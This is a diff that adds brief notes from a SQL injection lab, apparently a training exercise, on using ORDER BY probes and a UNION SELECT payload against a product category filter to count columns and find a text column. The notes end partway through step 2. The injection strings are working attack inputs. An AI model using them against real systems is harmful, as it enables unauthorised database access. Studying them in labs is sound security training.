@@ -1,0 +1,20 @@
+Lab - SQL injection UNION attack, finding a column containing text
+
+Vulnerable feature - Product category filter
+
+Goal - To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided
+
+Analysis:
+The results from te query are returned in the app's response -> can use UNION attack to retrieve
+data from other tables.
+
+1. Determine the No of columns returned by the query
+/filter?category=Pets'ORDER%20BY%204--
+-> returned error
+/filter?category=Pets'ORDER%20BY%203--
+-> Data
+-> There are 3 cols 
+
+2. Find the col that contain text
+Pets'UNION SELECT 'a', NULL, NULL, NULL -> Internal Server Error
+
